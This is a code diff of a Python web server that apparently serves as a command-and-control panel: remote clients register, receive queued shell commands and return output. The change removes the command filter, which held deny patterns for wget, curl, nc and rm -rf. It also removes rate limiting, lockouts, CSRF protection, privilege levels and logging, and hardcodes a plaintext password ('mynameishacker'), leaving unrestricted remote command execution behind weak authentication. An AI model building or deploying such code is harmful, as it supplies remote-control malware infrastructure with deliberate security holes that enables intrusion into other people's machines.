@@ -2,9 +2,8 @@
 # -*- coding: utf-8 -*-
 """
 Enhanced Secure Remote Control Server
-Ultra Fast + Multi-Platform + Fully Secured
+Ultra Fast + Fully Secured
 """
-import requests
 import json
 import time
 import urllib.parse
@@ -15,11 +14,9 @@ import sqlite3
 import os
 import secrets
 import re
-import hmac
 from datetime import datetime
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import socketserver
-import bcrypt
 
 class ThreadedHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
     daemon_threads = True
@@ -29,8 +26,6 @@ class SecureSessionManager:
     def __init__(self):
         self.sessions = {}
         self.session_timeout = 3600
-        self.max_sessions_per_ip = 3
-        self.failed_attempts = {}
         self.lock = threading.Lock()
         
     def clean_expired_sessions(self):
@@ -42,59 +37,16 @@ class SecureSessionManager:
         for session_id in expired_sessions:
             del self.sessions[session_id]
     
-    def record_failed_attempt(self, ip_address):
-        with self.lock:
-            if ip_address not in self.failed_attempts:
-                self.failed_attempts[ip_address] = {'count': 0, 'first_attempt': time.time()}
-            
-            self.failed_attempts[ip_address]['count'] += 1
-            self.failed_attempts[ip_address]['last_attempt'] = time.time()
-            
-            if self.failed_attempts[ip_address]['count'] >= 10:
-                block_time = min(3600, 300 * (2 ** (self.failed_attempts[ip_address]['count'] - 10)))
-                self.failed_attempts[ip_address]['blocked_until'] = time.time() + block_time
-                return True
-            return False
-    
-    def is_ip_blocked(self, ip_address):
-        with self.lock:
-            if ip_address not in self.failed_attempts:
-                return False
-            
-            attempts = self.failed_attempts[ip_address]
-            if 'blocked_until' in attempts:
-                if time.time() < attempts['blocked_until']:
-                    return True
-                else:
-                    del self.failed_attempts[ip_address]
-                    return False
-            return False
-    
-    def reset_failed_attempts(self, ip_address):
-        with self.lock:
-            if ip_address in self.failed_attempts:
-                del self.failed_attempts[ip_address]
-    
     def create_session(self, user_id, user_level, ip_address, user_agent):
         with self.lock:
             self.clean_expired_sessions()
             
-            if self.is_ip_blocked(ip_address):
-                return None, None
-            
-            ip_sessions = [s for s in self.sessions.values() if s['ip'] == ip_address]
-            if len(ip_sessions) >= self.max_sessions_per_ip:
-                oldest_session = min(ip_sessions, key=lambda x: x['created_at'])
-                del self.sessions[oldest_session['session_id']]
-            
             session_id = secrets.token_urlsafe(32)
             session_token = secrets.token_urlsafe(64)
-            csrf_token = secrets.token_urlsafe(32)
             
             self.sessions[session_id] = {
                 'session_id': session_id,
                 'session_token': session_token,
-                'csrf_token': csrf_token,
                 'user_id': user_id,
                 'user_level': user_level,
                 'ip': ip_address,
@@ -104,7 +56,7 @@ class SecureSessionManager:
                 'is_active': True
             }
             
-            return session_id, session_token, csrf_token
+            return session_id, session_token
     
     def validate_session(self, session_id, session_token, ip_address, user_agent):
         with self.lock:
@@ -127,142 +79,23 @@ class SecureSessionManager:
         with self.lock:
             if session_id in self.sessions:
                 del self.sessions[session_id]
-    
-    def validate_csrf_token(self, session_id, csrf_token):
-        with self.lock:
-            if session_id not in self.sessions:
-                return False
-            
-            session = self.sessions[session_id]
-            return secrets.compare_digest(session['csrf_token'], csrf_token)
 
-class PasswordManager:
-    def __init__(self):
-        self.failed_attempts = {}
-        self.lockout_time = {}
-        self.max_attempts = 10
-        
-        # كلمات المرور الثابتة مباشرة
-        self.passwords = {
-            'user_password': "hblackhat",
-            'admin_password': "sudohacker" 
-        }
-        
-        print(" PASSWORDS INITIALIZED:")
-        print(f"    User: {self.passwords['user_password']}")
-        print(f"    Admin: {self.passwords['admin_password']}")
-    
-    def load_passwords(self):
-        return self.passwords
-    
-    def verify_password(self, password, stored_password, client_ip=None):
-        # مقارنة مباشرة بسيطة
-        return password == stored_password
-    
-    def is_ip_locked(self, client_ip):
-        """تحقق بسيط من IP"""
-        if client_ip in self.lockout_time:
-            if time.time() < self.lockout_time[client_ip]:
-                return True
-            else:
-                del self.lockout_time[client_ip]
-        return False
-    
-    def record_failed_attempt(self, client_ip):
-        """تسجيل محاولة فاشلة"""
-        if client_ip:
-            if client_ip not in self.failed_attempts:
-                self.failed_attempts[client_ip] = 0
-            self.failed_attempts[client_ip] += 1
-            
-            if self.failed_attempts[client_ip] >= self.max_attempts:
-                self.lockout_time[client_ip] = time.time() + 3600
-    
-    def reset_failed_attempts(self, client_ip):
-        """إعادة تعيين المحاولات"""
-        if client_ip in self.failed_attempts:
-            del self.failed_attempts[client_ip]
-        if client_ip in self.lockout_time:
-            del self.lockout_time[client_ip]
-    
-    def hash_password(self, password):
-        return password
-            
-class CommandValidator:
-    def __init__(self):
-        self.allowed_commands = {
-            'sysinfo', 'status', 'ping', 'whoami', 'echo',
-            'uname -a', 'ls -la', 'dir', 'pwd', 'date',
-            'systeminfo', 'ipconfig', 'tasklist', 'netstat',
-            'ps aux', 'ifconfig', 'df -h', 'cat /etc/passwd'
-        }
-        
-        self.dangerous_patterns = [
-            r'rm\s+-rf', r'mkfs', r'dd\s+if=', r'>\s+/dev/', 
-            r'chmod\s+777', r'chown\s+root', r'passwd',
-            r'ssh-keygen', r'format\s+', r'fdisk', r'\./',
-            r'wget\s+', r'curl\s+', r'nc\s+', r'netcat\s+'
-        ]
-    
-    def is_command_safe(self, command):
-        if not command or len(command) > 1000:
-            return False
-            
-        command_lower = command.lower().strip()
-        
-        # التحقق من الأوامر المسموحة أولاً
-        if command_lower in self.allowed_commands:
-            return True
-        
-        # منع الأنماط الخطيرة
-        for pattern in self.dangerous_patterns:
-            if re.search(pattern, command_lower):
-                return False
-        
-        # السماح بأوامر محدودة آمنة
-        safe_prefixes = ('echo ', 'ping ', 'dir ', 'ls ')
-        if any(command_lower.startswith(prefix) for prefix in safe_prefixes):
-            return len(command) <= 200
-        
-        return False
-        
 class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
     sessions = {}
     commands_queue = {}
     session_manager = SecureSessionManager()
-    password_manager = PasswordManager()
-    command_validator = CommandValidator()
     session_lock = threading.Lock()
-    rate_limits = {}
+    
+    # كلمة المرور الثابتة
+    PASSWORD = "mynameishacker"
     
     SECURITY_HEADERS = {
         'X-Content-Type-Options': 'nosniff',
         'X-Frame-Options': 'DENY',
         'X-XSS-Protection': '1; mode=block',
-        'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
         'Content-Security-Policy': "default-src 'self'; script-src 'self'; style-src 'self'",
         'Referrer-Policy': 'strict-origin-when-cross-origin'
     }
-    
-    def check_rate_limit(self, ip_address):
-        current_time = time.time()
-        if ip_address in self.rate_limits:
-            if current_time - self.rate_limits[ip_address]['last_request'] < 0.1:
-                self.rate_limits[ip_address]['requests'] += 1
-                if self.rate_limits[ip_address]['requests'] > 100:
-                    return False
-            else:
-                self.rate_limits[ip_address] = {'last_request': current_time, 'requests': 1}
-        else:
-            self.rate_limits[ip_address] = {'last_request': current_time, 'requests': 1}
-        return True
-    
-    def get_client_info(self):
-        return {
-            'ip': self.client_address[0],
-            'user_agent': self.headers.get('User-Agent', 'Unknown'),
-            'time': datetime.now().isoformat()
-        }
     
     def get_session_from_cookie(self):
         cookie_header = self.headers.get('Cookie', '')
@@ -284,16 +117,11 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             self.headers.get('User-Agent', 'Unknown')
         )
     
-    def require_auth(self, min_level=1):
+    def require_auth(self):
         session = self.get_session_from_cookie()
         if not session:
             self.send_redirect('/')
             return None
-        
-        if session['user_level'] < min_level:
-            self.send_error(403, "Insufficient privileges")
-            return None
-        
         return session
     
     def send_redirect(self, location):
@@ -340,8 +168,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 client_id TEXT,
                 command TEXT,
                 response TEXT,
-                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
-                status TEXT
+                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
             )''',
             '''CREATE TABLE IF NOT EXISTS clients (
                 id TEXT PRIMARY KEY,
@@ -351,21 +178,6 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 first_seen DATETIME,
                 last_seen DATETIME,
                 status TEXT
-            )''',
-            '''CREATE TABLE IF NOT EXISTS security_logs (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                ip TEXT,
-                action TEXT,
-                severity TEXT,
-                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
-            )''',
-            '''CREATE TABLE IF NOT EXISTS auth_logs (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                ip TEXT,
-                user TEXT,
-                action TEXT,
-                success BOOLEAN,
-                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
             )'''
         ]
         
@@ -376,46 +188,17 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 print(f"Database error: {e}")
         self.conn.commit()
     
-    def log_security_event(self, action, severity="INFO"):
-        try:
-            self.cursor.execute(
-                'INSERT INTO security_logs (ip, action, severity) VALUES (?, ?, ?)',
-                (self.client_address[0], action, severity)
-            )
-            self.conn.commit()
-        except:
-            pass
-    
-    def log_auth_event(self, user, action, success):
-        try:
-            self.cursor.execute(
-                'INSERT INTO auth_logs (ip, user, action, success) VALUES (?, ?, ?, ?)',
-                (self.client_address[0], user, action, success)
-            )
-            self.conn.commit()
-        except:
-            pass
-    
     def do_GET(self):
-        if not self.check_rate_limit(self.client_address[0]):
-            self.send_error(429, "Too many requests")
-            return
-        
         try:
             parsed_path = urllib.parse.urlparse(self.path)
             path = parsed_path.path
             
             routes = {
                 '/': self.send_login_page,
-                '/admin-auth': self.send_admin_auth_page,
                 '/control': self.send_control_panel,
                 '/sessions': self.send_sessions_list,
                 '/commands': self.handle_get_commands,
                 '/result': self.handle_get_result,
-                '/download-client': self.download_python_client,
-                '/history': self.send_command_history,
-                '/status': self.send_system_status,
-                '/settings': self.send_settings_page,
                 '/logout': self.handle_logout
             }
             
@@ -423,14 +206,9 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             handler()
                 
         except Exception as e:
-            self.log_security_event(f"GET Error: {str(e)}", "ERROR")
             self.send_error(500, "Internal server error")
     
     def do_POST(self):
-        if not self.check_rate_limit(self.client_address[0]):
-            self.send_error(429, "Too many requests")
-            return
-        
         try:
             content_length = int(self.headers.get('Content-Length', 0))
             if content_length > 10000:
@@ -442,25 +220,21 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             
             routes = {
                 '/login': self.handle_login,
-                '/admin-login': self.handle_admin_login,
                 '/execute': self.handle_execute_command,
                 '/response': self.handle_client_response,
-                '/register': self.handle_client_register,
-                '/change-password': self.handle_change_password
+                '/register': self.handle_client_register
             }
             
             handler = routes.get(self.path, lambda x: self.send_error(404, "Not found"))
             handler(data)
                 
         except Exception as e:
-            self.log_security_event(f"POST Error: {str(e)}", "ERROR")
             self.send_json({'success': False, 'error': 'Internal server error'})
     
     def handle_logout(self):
         session = self.get_session_from_cookie()
         if session:
             self.session_manager.invalidate_session(session['session_id'])
-            self.log_auth_event(session['user_id'], 'logout', True)
         
         cookies = [
             'session_id=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly',
@@ -469,10 +243,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         self.send_redirect('/')
     
     def send_login_page(self):
-        # توليد توكن CSRF عشوائي لكل جلسة
-        csrf_token = secrets.token_hex(32)
-        
-        html = f'''<!DOCTYPE html>
+        html = '''<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -481,10 +252,10 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
     <meta name="referrer" content="no-referrer">
     <title>System Authentication</title>
     <style>
-        *{{margin:0;padding:0;box-sizing:border-box;max-width:100%}}
-        html,body{{height:100%;overflow-x:hidden;font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}}
+        *{margin:0;padding:0;box-sizing:border-box;max-width:100%}
+        html,body{height:100%;overflow-x:hidden;font-family:system-ui,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
         
-        body{{
+        body{
             background:linear-gradient(145deg,#0f0f23 0%,#1a1a2e 50%,#16213e 100%);
             display:flex;
             align-items:center;
@@ -492,9 +263,9 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             min-height:100vh;
             position:relative;
             color:#e0e0e0
-        }}
+        }
         
-        body::before{{
+        body::before{
             content:'';
             position:fixed;
             top:0;
@@ -507,9 +278,9 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 radial-gradient(circle at 40% 40%,rgba(74,240,74,0.05) 0%,transparent 50%);
             pointer-events:none;
             z-index:-1
-        }}
+        }
         
-        .auth-container{{
+        .auth-container{
             background:rgba(15,15,35,0.95);
             backdrop-filter:blur(20px) saturate(180%);
             border:1px solid rgba(255,255,255,0.08);
@@ -522,9 +293,9 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 inset 0 1px 0 rgba(255,255,255,0.1);
             position:relative;
             overflow:hidden
-        }}
+        }
         
-        .auth-container::before{{
+        .auth-container::before{
             content:'';
             position:absolute;
             top:0;
@@ -532,14 +303,14 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             right:0;
             height:1px;
             background:linear-gradient(90deg,transparent,rgba(74,74,240,0.6),transparent)
-        }}
+        }
         
-        .header{{
+        .header{
             text-align:center;
             margin-bottom:2.5rem
-        }}
+        }
         
-        .icon{{
+        .icon{
             font-size:4rem;
             margin-bottom:1rem;
             background:linear-gradient(135deg,#4a4af0,#f04a4a);
@@ -547,9 +318,9 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             background-clip:text;
             -webkit-text-fill-color:transparent;
             filter:drop-shadow(0 4px 8px rgba(74,74,240,0.3))
-        }}
+        }
         
-        .title{{
+        .title{
             font-size:2rem;
             font-weight:700;
             background:linear-gradient(135deg,#e0e0e0,#a0a0c0);
@@ -558,16 +329,16 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             -webkit-text-fill-color:transparent;
             margin-bottom:0.5rem;
             letter-spacing:-0.5px
-        }}
+        }
         
-        .subtitle{{
+        .subtitle{
             color:#888;
             font-size:0.95rem;
             line-height:1.5;
             opacity:0.8
-        }}
+        }
         
-        .security-badge{{
+        .security-badge{
             background:linear-gradient(135deg,rgba(240,74,74,0.1),rgba(240,74,74,0.2));
             border:1px solid rgba(240,74,74,0.3);
             border-radius:12px;
@@ -577,19 +348,19 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             font-size:0.9rem;
             display:none;
             animation:pulse 2s infinite
-        }}
+        }
         
-        @keyframes pulse{{
-            0%,100%{{opacity:1}}
-            50%{{opacity:0.7}}
-        }}
+        @keyframes pulse{
+            0%,100%{opacity:1}
+            50%{opacity:0.7}
+        }
         
-        .input-group{{
+        .input-group{
             margin-bottom:1.5rem;
             position:relative
-        }}
+        }
         
-        .password-input{{
+        .password-input{
             width:100%;
             padding:1.2rem 1rem;
             background:rgba(255,255,255,0.05);
@@ -599,22 +370,22 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             font-size:1rem;
             transition:all 0.3s ease;
             letter-spacing:2px
-        }}
+        }
         
-        .password-input:focus{{
+        .password-input:focus{
             outline:none;
             border-color:#4a4af0;
             background:rgba(255,255,255,0.08);
             box-shadow:0 0 0 4px rgba(74,74,240,0.15);
             letter-spacing:3px
-        }}
+        }
         
-        .password-input::placeholder{{
+        .password-input::placeholder{
             color:#666;
             letter-spacing:normal
-        }}
+        }
         
-        .auth-button{{
+        .auth-button{
             width:100%;
             padding:1.2rem;
             background:linear-gradient(135deg,#4a4af0,#3a3ad0);
@@ -627,9 +398,9 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             transition:all 0.3s ease;
             position:relative;
             overflow:hidden
-        }}
+        }
         
-        .auth-button::before{{
+        .auth-button::before{
             content:'';
             position:absolute;
             top:0;
@@ -638,57 +409,57 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             height:100%;
             background:linear-gradient(90deg,transparent,rgba(255,255,255,0.2),transparent);
             transition:left 0.5s
-        }}
+        }
         
-        .auth-button:hover::before{{
+        .auth-button:hover::before{
             left:100%
-        }}
+        }
         
-        .auth-button:hover{{
+        .auth-button:hover{
             transform:translateY(-2px);
             box-shadow:0 8px 25px rgba(74,74,240,0.4)
-        }}
+        }
         
-        .auth-button:active{{
+        .auth-button:active{
             transform:translateY(0)
-        }}
+        }
         
-        .auth-button:disabled{{
+        .auth-button:disabled{
             opacity:0.6;
             cursor:not-allowed;
             transform:none
-        }}
+        }
         
-        .footer{{
+        .footer{
             margin-top:2rem;
             padding-top:1.5rem;
             border-top:1px solid rgba(255,255,255,0.1);
             text-align:center;
             color:#666;
             font-size:0.8rem
-        }}
+        }
         
-        .protection-status{{
+        .protection-status{
             display:flex;
             align-items:center;
             justify-content:center;
             gap:0.5rem;
             margin-top:0.5rem;
             color:#4aaf4a
-        }}
+        }
         
-        @media (max-width:480px){{
-            .auth-container{{
+        @media (max-width:480px){
+            .auth-container{
                 padding:2rem;
                 margin:1rem
-            }}
+            }
             
-            .title{{
+            .title{
                 font-size:1.75rem
-            }}
-        }}
+            }
+        }
         
-        .sr-only{{
+        .sr-only{
             position:absolute;
             width:1px;
             height:1px;
@@ -698,21 +469,21 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             clip:rect(0,0,0,0);
             white-space:nowrap;
             border:0
-        }}
+        }
         
-        .auth-container{{
+        .auth-container{
             -webkit-user-select:none;
             -moz-user-select:none;
             -ms-user-select:none;
             user-select:none
-        }}
+        }
         
-        .password-input{{
+        .password-input{
             -webkit-user-select:text;
             -moz-user-select:text;
             -ms-user-select:text;
             user-select:text
-        }}
+        }
     </style>
 </head>
 <body>
@@ -744,8 +515,8 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 >
             </div>
             
-            <input type="hidden" id="csrfToken" value="{csrf_token}">
-            <input type="hidden" id="sessionId" value="{secrets.token_hex(16)}">
+            <input type="hidden" id="csrfToken" value="''' + secrets.token_hex(32) + '''">
+            <input type="hidden" id="sessionId" value="''' + secrets.token_hex(16) + '''">
             
             <button type="submit" class="auth-button" id="authButton">
                 Verify Identity
@@ -762,227 +533,65 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
     </div>
 
     <script>
-        async function verifyAuthentication() {{
+        async function verifyAuthentication() {
             const authKey = document.getElementById('authKey').value;
             
-            if (!authKey.trim()) {{
+            if (!authKey.trim()) {
                 alert('Authentication key required');
                 return;
-            }}
+            }
             
             const button = document.getElementById('authButton');
             button.disabled = true;
             button.textContent = 'Verifying...';
             
-            try {{
-                const response = await fetch('/login', {{
+            try {
+                const response = await fetch('/login', {
                     method: 'POST',
-                    headers: {{'Content-Type': 'application/json'}},
-                    body: JSON.stringify({{password: authKey}})
-                }});
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({password: authKey})
+                });
                 
                 const data = await response.json();
                 
-                if (data.success) {{
-                    window.location.href = '/admin-auth';
-                }} else {{
+                if (data.success) {
+                    window.location.href = '/control';
+                } else {
                     alert('Authentication failed! Wrong password.');
-                }}
-            }} catch (error) {{
+                }
+            } catch (error) {
                 alert('Network error');
-            }} finally {{
+            } finally {
                 button.disabled = false;
                 button.textContent = 'Verify Identity';
                 document.getElementById('authKey').value = '';
-            }}
-        }}
+            }
+        }
         
         // event listeners
         document.getElementById('authForm').addEventListener('submit', verifyAuthentication);
         
-        document.getElementById('authKey').addEventListener('keypress', function(e) {{
+        document.getElementById('authKey').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') verifyAuthentication();
-        }});
+        });
         
         // Auto-focus
-        setTimeout(() => {{
+        setTimeout(() => {
             document.getElementById('authKey').focus();
-        }}, 100);
+        }, 100);
     </script>
 </body>
 </html>'''
         
-        self.send_response(200)
-        self.send_header('Content-type', 'text/html; charset=utf-8')
-        self.send_header('X-Frame-Options', 'DENY')
-        self.send_header('X-Content-Type-Options', 'nosniff')
-        self.send_header('X-XSS-Protection', '1; mode=block')
-        self.send_header('Referrer-Policy', 'no-referrer')
-        self.send_header('Content-Security-Policy', "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'")
-        self.end_headers()
-        self.wfile.write(html.encode('utf-8'))
-    
-    def send_admin_auth_page(self):
-        session = self.require_auth(1)
-        if not session:
-            return
-            
-        html = '''
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Admin Authentication</title>
-            <meta charset="utf-8">
-            <style>
-                * { margin: 0; padding: 0; box-sizing: border-box; }
-                body { 
-                    font-family: 'Segoe UI', Arial, sans-serif; 
-                    background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
-                    color: white; 
-                    display: flex; 
-                    justify-content: center; 
-                    align-items: center; 
-                    height: 100vh;
-                    margin: 0;
-                }
-                .container { 
-                    background: rgba(45, 45, 45, 0.95); 
-                    padding: 40px; 
-                    border-radius: 15px; 
-                    text-align: center;
-                    backdrop-filter: blur(10px);
-                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
-                    width: 400px;
-                }
-                .logo { 
-                    font-size: 48px; 
-                    margin-bottom: 20px; 
-                }
-                input, button { 
-                    padding: 15px; 
-                    margin: 10px; 
-                    width: 280px; 
-                    border-radius: 8px; 
-                    font-size: 16px;
-                    border: none;
-                    transition: all 0.2s ease;
-                }
-                input { 
-                    background: rgba(255,255,255,0.1); 
-                    color: white; 
-                    border: 1px solid rgba(255,255,255,0.2); 
-                }
-                input:focus {
-                    outline: none;
-                    border-color: #e74c3c;
-                }
-                button { 
-                    background: linear-gradient(135deg, #e74c3c, #c0392b); 
-                    color: white; 
-                    border: none; 
-                    cursor: pointer;
-                    font-weight: bold;
-                }
-                button:hover {
-                    background: linear-gradient(135deg, #c0392b, #a93226);
-                    transform: translateY(-2px);
-                }
-                .security-level {
-                    background: rgba(231, 76, 60, 0.2);
-                    padding: 10px;
-                    border-radius: 5px;
-                    margin: 10px 0;
-                    border: 1px solid #e74c3c;
-                }
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <div class="logo">HBH</div>
-                <h2>Admin Authentication</h2>
-                <p style="color: #ccc; margin-bottom: 30px;">Level 2 Security - Administrative Access</p>
-                
-                <div class="security-level">
-                    HIGH SECURITY LEVEL - ADMIN ACCESS REQUIRED
-                </div>
-                
-                <input type="password" id="adminPassword" placeholder="Enter Admin Password" autocomplete="off">
-                <button onclick="adminLogin()">Admin Authentication</button>
-                
-                <div style="margin-top: 20px; font-size: 12px; color: #888;">
-                    Unauthorized access will be logged and blocked
-                </div>
-            </div>
-            <script>
-                async function adminLogin() {
-                    const password = document.getElementById('adminPassword').value;
-                    if (!password) {
-                        alert('Please enter admin password');
-                        return;
-                    }
-                    
-                    try {
-                        const response = await fetch('/admin-login', {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({password: password})
-                        });
-                        
-                        const data = await response.json();
-                        if (data.success) {
-                            window.location = '/control';
-                        } else {
-                            alert('Admin authentication failed! Access denied.');
-                        }
-                    } catch (err) {
-                        alert('Connection error');
-                    }
-                }
-                
-                document.getElementById('adminPassword').addEventListener('keypress', function(e) {
-                    if (e.key === 'Enter') adminLogin();
-                });
-            </script>
-        </body>
-        </html>
-        '''
         self.send_html(html)
     
     def handle_login(self, data):
         password = data.get('password', '')
-        passwords = self.password_manager.load_passwords()
         
-        # ✅ مقارنة مباشرة فورية بدون تعقيد
-        if password == passwords['user_password']:
-            session_id, session_token, csrf_token = self.session_manager.create_session(
-                'user', 1, self.client_address[0], self.headers.get('User-Agent', 'Unknown')
-            )
-            
-            if session_id:
-                cookies = [
-                    f'session_id={session_id}; Path=/; HttpOnly; SameSite=Strict',
-                    f'session_token={session_token}; Path=/; HttpOnly; SameSite=Strict'
-                ]
-                
-                self.session_manager.reset_failed_attempts(self.client_address[0])
-                self.log_auth_event('user', 'level1_login', True)
-                self.send_json({'success': True}, cookies=cookies)
-            else:
-                self.send_json({'success': False, 'error': 'Session creation failed'})
-        else:
-            self.send_json({'success': False, 'error': 'Invalid password'})
-    
-    def handle_admin_login(self, data):
-        session = self.require_auth(1)
-        if not session:
-            return
-        
-        password = data.get('password', '')
-        passwords = self.password_manager.load_passwords()
-        
-        # ✅ مقارنة مباشرة فورية بدون تعقيد
-        if password == passwords['admin_password']:
-            session_id, session_token, csrf_token = self.session_manager.create_session(
+        # ✅ مقارنة مباشرة مع كلمة المرور
+        if password == self.PASSWORD:
+            # ✅ إنشاء جلسة مباشرة
+            session_id, session_token = self.session_manager.create_session(
                 'admin', 2, self.client_address[0], self.headers.get('User-Agent', 'Unknown')
             )
             
@@ -991,16 +600,15 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     f'session_id={session_id}; Path=/; HttpOnly; SameSite=Strict',
                     f'session_token={session_token}; Path=/; HttpOnly; SameSite=Strict'
                 ]
-                
-                self.log_auth_event('admin', 'level2_login', True)
                 self.send_json({'success': True}, cookies=cookies)
             else:
                 self.send_json({'success': False, 'error': 'Session creation failed'})
         else:
-            self.send_json({'success': False, 'error': 'Invalid admin password'})
+            self.send_json({'success': False, 'error': 'Invalid password'})
     
     def send_control_panel(self):
-        session = self.require_auth(2)
+        # ✅ التحقق من الجلسة أولاً
+        session = self.require_auth()
         if not session:
             return
         
@@ -1532,7 +1140,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 }
                 
                 function openSettings() {
-                    window.open('/settings', '_blank');
+                    alert('Settings page would open here');
                 }
                 
                 function logout() {
@@ -1589,7 +1197,6 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 if incoming_os != 'Unknown':
                     self.sessions[existing_client]['os'] = incoming_os
 
-                self.log_security_event(f"Client updated: {incoming_computer} ({incoming_user})", "INFO")
                 self.send_json({'success': True, 'client_id': existing_client})
             else:
                 self.sessions[client_id] = {
@@ -1605,11 +1212,10 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     'last_response': None,
                     'status': 'online'
                 }
-                self.log_security_event(f"New client registered: {incoming_computer} ({incoming_user})", "INFO")
                 self.send_json({'success': True, 'client_id': client_id})
                 
     def send_sessions_list(self):
-        session = self.require_auth(1)
+        session = self.require_auth()
         if not session:
             return
             
@@ -1631,7 +1237,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             self.send_json(active_clients)
     
     def handle_get_commands(self):
-        session = self.require_auth(1)
+        session = self.require_auth()
         if not session:
             return
             
@@ -1653,7 +1259,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 self.send_json({'error': 'Client not found'})
     
     def handle_execute_command(self, data):
-        session = self.require_auth(1)
+        session = self.require_auth()
         if not session:
             return
             
@@ -1664,30 +1270,16 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             if not command:
                 self.send_json({'success': False, 'error': 'No command provided'})
                 return
-                
-            if not self.command_validator.is_command_safe(command):
-                self.log_security_event(f"Blocked dangerous command: {command}", "HIGH")
-                self.send_json({'success': False, 'error': 'Command not allowed'})
-                return
             
             if client_id in self.sessions:
                 self.sessions[client_id]['pending_command'] = command
                 self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
-                
-                self.log_security_event(f"Command executed: {command} on {client_id}", "INFO")
                 self.send_json({'success': True})
-                
-                if hasattr(self, 'cursor'):
-                    self.cursor.execute(
-                        'INSERT INTO commands (client_id, command, status) VALUES (?, ?, ?)',
-                        (client_id, command, 'sent')
-                    )
-                    self.conn.commit()
             else:
                 self.send_json({'success': False, 'error': 'Client not found'})
     
     def handle_get_result(self):
-        session = self.require_auth(1)
+        session = self.require_auth()
         if not session:
             return
             
@@ -1702,13 +1294,6 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 result = self.sessions[client_id]['last_response']
                 self.sessions[client_id]['last_response'] = None
                 self.send_json({'result': result})
-                
-                if hasattr(self, 'cursor'):
-                    self.cursor.execute(
-                        'UPDATE commands SET response = ?, status = ? WHERE client_id = ? AND command = ? AND response IS NULL',
-                        (result, 'completed', client_id, command)
-                    )
-                    self.conn.commit()
             else:
                 self.send_json({'pending': True})
     
@@ -1724,324 +1309,6 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             
             self.send_json({'success': True})
     
-    def send_settings_page(self):
-        session = self.require_auth(2)
-        if not session:
-            return
-            
-        html = '''
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>Security Settings</title>
-            <meta charset="utf-8">
-            <style>
-                * { margin: 0; padding: 0; box-sizing: border-box; }
-                body {
-                    font-family: 'Segoe UI', Arial, sans-serif;
-                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                    color: white;
-                    margin: 0;
-                    padding: 20px;
-                    min-height: 100vh;
-                }
-                .container {
-                    max-width: 600px;
-                    margin: 20px auto;
-                    background: rgba(45, 45, 45, 0.95);
-                    padding: 30px;
-                    border-radius: 15px;
-                    backdrop-filter: blur(10px);
-                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
-                }
-                .header {
-                    text-align: center;
-                    margin-bottom: 30px;
-                }
-                .logo {
-                    font-size: 48px;
-                    margin-bottom: 10px;
-                }
-                .password-form {
-                    background: rgba(255,255,255,0.05);
-                    padding: 20px;
-                    border-radius: 10px;
-                    margin: 20px 0;
-                    border: 1px solid rgba(255,255,255,0.1);
-                }
-                input, select, button {
-                    width: 100%;
-                    padding: 12px;
-                    margin: 8px 0;
-                    border-radius: 6px;
-                    border: none;
-                    font-size: 16px;
-                    transition: all 0.2s ease;
-                }
-                input, select {
-                    background: rgba(255,255,255,0.1);
-                    color: white;
-                    border: 1px solid rgba(255,255,255,0.2);
-                }
